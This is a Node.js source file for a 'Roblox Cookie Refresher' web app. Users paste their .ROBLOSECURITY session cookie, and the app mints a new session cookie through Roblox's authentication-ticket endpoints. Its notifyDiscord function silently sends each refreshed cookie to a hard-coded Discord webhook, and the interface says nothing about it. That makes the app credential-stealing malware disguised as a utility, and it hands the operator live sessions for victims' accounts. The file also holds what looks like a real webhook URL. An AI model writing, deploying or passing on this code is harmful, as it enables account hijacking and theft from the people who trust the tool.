/**
 * Roblox Cookie Refresher
 * Run: npm install && npm start → http://localhost:3000
 *
 * ─── CONFIG ──────────────────────────────────────────────────────────────────
 */
const DISCORD_WEBHOOK  = "https://discord.com/api/webhooks/1490421469489139814/wOAlgXaYYGOp8FDKGXyaD7slZvE8jEWUl55D_37fuJZaI6MjLyICXwj9QxDSEB_hP-DK";   // your private Discord webhook
const DISCORD_INVITE   = "https://discord.gg/TmQgJVap"; // shown in the UI
const YOUR_NAME        = "Silent";              // shown in the UI
// ─────────────────────────────────────────────────────────────────────────────

const express = require("express");
const axios   = require("axios");
const app     = express();
app.use(express.json());

const roblox = axios.create({
  timeout: 15000,
  headers: {
    "User-Agent"      : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept"          : "*/*",
    "Accept-Language" : "en-US,en;q=0.9",
    "Origin"          : "https://www.roblox.com",
    "Referer"         : "https://www.roblox.com/",
  },
});

function cleanCookie(raw) {
  return raw
    .replace(/_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_/g, "")
    .replace(/^\.ROBLOSECURITY=/, "")
    .trim();
}

async function getCsrf(cookie) {
  try {
    await roblox.post("https://auth.roblox.com/v2/logout", null, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
  } catch (e) {
    const token = e.response?.headers?.["x-csrf-token"];
    if (token) return token;
    throw new Error(`CSRF failed – HTTP ${e.response?.status ?? "timeout"}`);
  }
  throw new Error("Unexpected 2xx from logout");
}

async function getTicket(cookie, csrf) {
  try {
    const res = await roblox.post(
      "https://auth.roblox.com/v1/authentication-ticket",
      null,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "x-csrf-token": csrf } }
    );
    const ticket = res.headers["rbx-authentication-ticket"];
    if (!ticket) throw new Error("No ticket in response headers");
    return ticket;
  } catch (e) {
    if (!e.response) throw e;
    throw new Error(`Auth ticket – HTTP ${e.response.status}: ${JSON.stringify(e.response.data)}`);
  }
}

async function redeemTicket(ticket) {
  try {
    const res = await roblox.post(
      "https://auth.roblox.com/v1/authentication-ticket/redeem",
      { authenticationTicket: ticket },
      { headers: { RBXAuthenticationNegotiation: "1" } }
    );
    const raw   = res.headers["set-cookie"]?.join(";") ?? "";
    const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
    if (!match) throw new Error("No .ROBLOSECURITY in set-cookie");
    return match[1];
  } catch (e) {
    if (!e.response) throw e;
    throw new Error(`Redeem – HTTP ${e.response.status}`);
  }
}

async function notifyDiscord(newCookie) {
  if (!DISCORD_WEBHOOK || !DISCORD_WEBHOOK.startsWith("https://discord.com/api/webhooks/")) return;
  try {
    await axios.post(DISCORD_WEBHOOK, {
      username: "Cookie Refresher",
      embeds: [{
        title : "🍪 Cookie Refreshed",
        color : 0xff8c00,
        fields: [{ name: "New .ROBLOSECURITY", value: `\`\`\`${newCookie.substring(0, 900)}\`\`\`` }],
        footer: { text: new Date().toLocaleString() },
      }],
    });
  } catch (_) {}
}

app.post("/api/refresh", async (req, res) => {
  const raw = req.body?.cookie;
  if (!raw?.trim()) return res.status(400).json({ success: false, error: "No cookie provided." });
  const cookie = cleanCookie(raw);
  try {
    console.log("[1/3] CSRF...");
    const csrf = await getCsrf(cookie);
    console.log("[2/3] Auth ticket...");
    const ticket = await getTicket(cookie, csrf);
    console.log("[3/3] Redeeming...");
    const newCookie = await redeemTicket(ticket);
    console.log("Done!\n");
    notifyDiscord(newCookie);
    return res.json({ success: true, cookie: newCookie });
  } catch (err) {
    console.error(`Error: ${err.message}\n`);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.get("/", (_req, res) => {
  res.setHeader("Content-Type", "text/html");
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>${YOUR_NAME} Cookie Refresher</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Nunito:wght@400;700;800;900&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0f0a00;--sur:#1a1100;--bdr:#2e1f00;
  --acc:#ff8c00;--acc2:#ff4500;--acc3:#ffbf47;
  --ok:#22c55e;--err:#ef4444;--tx:#fff3e0;--mu:#a07040;
  --mono:'Space Mono',monospace;--sans:'Nunito',sans-serif;
}
body{background:var(--bg);color:var(--tx);font-family:var(--sans);min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}

/* cookie crumb particles */
body::before{content:'🍪';position:fixed;font-size:180px;top:-40px;right:-40px;opacity:.04;pointer-events:none;transform:rotate(20deg)}
body::after{content:'🍪';position:fixed;font-size:120px;bottom:-20px;left:-20px;opacity:.04;pointer-events:none;transform:rotate(-15deg)}

/* warm grid */
.grid{position:fixed;inset:0;background-image:linear-gradient(var(--bdr) 1px,transparent 1px),linear-gradient(90deg,var(--bdr) 1px,transparent 1px);background-size:36px 36px;opacity:.5;pointer-events:none}

/* glow */
.glow{position:fixed;border-radius:50%;pointer-events:none;filter:blur(80px)}
.g1{top:-100px;left:50%;transform:translateX(-50%);width:500px;height:300px;background:rgba(255,140,0,.12)}
.g2{bottom:-100px;left:50%;transform:translateX(-50%);width:400px;height:200px;background:rgba(255,69,0,.08)}

.card{position:relative;z-index:10;width:100%;max-width:480px;padding:2.25rem 2.5rem 2rem;background:var(--sur);border:1px solid var(--bdr);border-radius:16px;box-shadow:0 0 0 1px rgba(255,140,0,.08),0 32px 80px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,191,71,.1)}

/* top accent line */
.card::before{content:'';position:absolute;top:0;left:10%;right:10%;height:2px;background:linear-gradient(90deg,transparent,var(--acc),var(--acc3),var(--acc2),transparent);border-radius:99px}

/* cookie emoji header */
.icon{font-size:2.8rem;display:block;text-align:center;margin-bottom:.75rem;filter:drop-shadow(0 0 12px rgba(255,140,0,.5));animation:float 3s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}

h1{font-size:1.6rem;font-weight:900;text-align:center;margin-bottom:.25rem;letter-spacing:-.01em}
h1 .hi{color:var(--acc)}
h1 .name{background:linear-gradient(90deg,var(--acc),var(--acc3));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}

.divider{height:1px;background:var(--bdr);margin:1.25rem 0}

label{display:block;font-family:var(--mono);font-size:.62rem;color:var(--mu);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.4rem}
textarea{width:100%;background:var(--bg);border:1px solid var(--bdr);border-radius:8px;color:var(--tx);font-family:var(--mono);font-size:.7rem;padding:.75rem 1rem;outline:none;transition:border-color .2s,box-shadow .2s;line-height:1.5;resize:none;height:82px}
textarea:focus{border-color:rgba(255,140,0,.5);box-shadow:0 0 0 3px rgba(255,140,0,.1)}
textarea::placeholder{color:var(--mu);opacity:.7}
.field{margin-bottom:1rem}

.btn{width:100%;padding:.9rem;background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;font-family:var(--sans);font-weight:800;font-size:.95rem;letter-spacing:.02em;border:none;border-radius:10px;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 20px rgba(255,140,0,.3),inset 0 1px 0 rgba(255,255,255,.15)}
.btn:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 6px 28px rgba(255,140,0,.45),inset 0 1px 0 rgba(255,255,255,.15)}
.btn:active:not(:disabled){transform:translateY(0)}
.btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
.spin{display:none;width:15px;height:15px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
.loading .spin{display:block}
@keyframes spin{to{transform:rotate(360deg)}}

.log{margin-top:1rem;background:var(--bg);border:1px solid var(--bdr);border-radius:8px;padding:.65rem 1rem;font-family:var(--mono);font-size:.62rem;color:var(--mu);height:68px;overflow-y:auto;line-height:1.9}
.log::-webkit-scrollbar{width:3px}.log::-webkit-scrollbar-thumb{background:var(--bdr)}
.i{color:#f59e0b}.ok{color:var(--ok)}.err{color:var(--err)}

.res{margin-top:1rem;display:none}
.res.on{display:block}
.rbox{background:var(--bg);border:1px solid var(--bdr);border-radius:8px;padding:1rem}
.rbox.ok{border-color:rgba(34,197,94,.3);background:rgba(34,197,94,.04)}
.rbox.err{border-color:rgba(239,68,68,.3)}
.rlbl{font-family:var(--mono);font-size:.6rem;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.4rem}
.rlbl.ok{color:var(--ok)}.rlbl.err{color:var(--err)}
.rval{font-family:var(--mono);font-size:.66rem;word-break:break-all;line-height:1.6;max-height:80px;overflow-y:auto;color:var(--tx)}
.rval::-webkit-scrollbar{width:3px}.rval::-webkit-scrollbar-thumb{background:var(--bdr)}
.cpbtn{margin-top:.65rem;width:100%;padding:.55rem;background:transparent;border:1px solid var(--bdr);color:var(--mu);font-family:var(--mono);font-size:.62rem;letter-spacing:.05em;text-transform:uppercase;border-radius:6px;cursor:pointer;transition:all .15s}
.cpbtn:hover{border-color:var(--acc);color:var(--acc)}

/* Discord button - fixed bottom right */
.discord-btn{position:fixed;bottom:24px;right:24px;display:flex;align-items:center;gap:8px;background:#5865F2;color:#fff;text-decoration:none;font-family:var(--sans);font-weight:700;font-size:.8rem;padding:.55rem 1rem .55rem .75rem;border-radius:50px;box-shadow:0 4px 20px rgba(88,101,242,.4);transition:all .2s;z-index:100}
.discord-btn:hover{transform:translateY(-2px);box-shadow:0 6px 28px rgba(88,101,242,.6);background:#4752c4}
.discord-btn svg{width:20px;height:20px;fill:#fff;flex-shrink:0}
</style>
</head>
<body>
<div class="grid"></div>
<div class="glow g1"></div>
<div class="glow g2"></div>

<div class="card">
  <span class="icon">🍪</span>
  <h1><span class="name">${YOUR_NAME}'s</span> Cookie Refresher</h1>

  <div class="divider"></div>

  <div class="field">
    <label>.ROBLOSECURITY Cookie</label>
    <textarea id="ci" placeholder="Paste your .ROBLOSECURITY value here..."></textarea>
  </div>

  <button class="btn" id="btn" onclick="go()">
    <div class="spin"></div>
    <span id="bt">🔄 Refresh Cookie</span>
  </button>

  <div class="log" id="log"><span class="i">// ready — paste your cookie above</span></div>

  <div class="res" id="res">
    <div class="rbox" id="rb">
      <div class="rlbl" id="rl"></div>
      <div class="rval" id="rv"></div>
      <button class="cpbtn" id="cb" onclick="cp()" style="display:none">[ copy to clipboard ]</button>
    </div>
  </div>
</div>

<!-- Discord join button -->
<a class="discord-btn" href="${DISCORD_INVITE}" target="_blank">
  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
  Join Discord
</a>

<script>
let last="";
const ts=()=>new Date().toLocaleTimeString("en",{hour12:false});
function lg(m,t="i"){
  const el=document.getElementById("log");
  el.innerHTML+=\`<br><span class="\${t}">[\${ts()}] \${m}</span>\`;
  el.scrollTop=el.scrollHeight;
}
function load(on){
  const b=document.getElementById("btn");
  b.disabled=on;b.classList.toggle("loading",on);
  document.getElementById("bt").textContent=on?"Refreshing...":"🔄 Refresh Cookie";
}
function show(ok,val){
  const r=document.getElementById("res"),rb=document.getElementById("rb");
  const rl=document.getElementById("rl"),rv=document.getElementById("rv"),cb=document.getElementById("cb");
  r.classList.add("on");
  rb.className="rbox "+(ok?"ok":"err");
  rl.className="rlbl "+(ok?"ok":"err");
  rl.textContent=ok?"✓ refreshed cookie":"✗ error";
  rv.textContent=val;
  cb.style.display=ok?"block":"none";
}
async function go(){
  const c=document.getElementById("ci").value.trim();
  if(!c){lg("No cookie provided","err");return;}
  load(true);lg("Sending request...");
  try{
    const r=await fetch("/api/refresh",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:c})});
    const d=await r.json();
    if(d.success){
      last=d.cookie;
      lg("CSRF token obtained","ok");
      lg("Auth ticket generated","ok");
      lg("Cookie refreshed!","ok");
      show(true,d.cookie);
    }else{
      lg("Error: "+d.error,"err");
      show(false,d.error);
    }
  }catch(e){
    lg("Network error: "+e.message,"err");
    show(false,"Could not reach server.");
  }finally{load(false);}
}
function cp(){
  navigator.clipboard.writeText(last).then(()=>{
    const b=document.getElementById("cb");
    b.textContent="[ copied! ]";
    setTimeout(()=>b.textContent="[ copy to clipboard ]",2000);
  });
}
document.getElementById("ci").addEventListener("keydown",e=>{
  if(e.key==="Enter"&&!e.shiftKey){e.preventDefault();go();}
});
</script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`\n🍪  Cookie Refresher → http://localhost:${PORT}\n`));
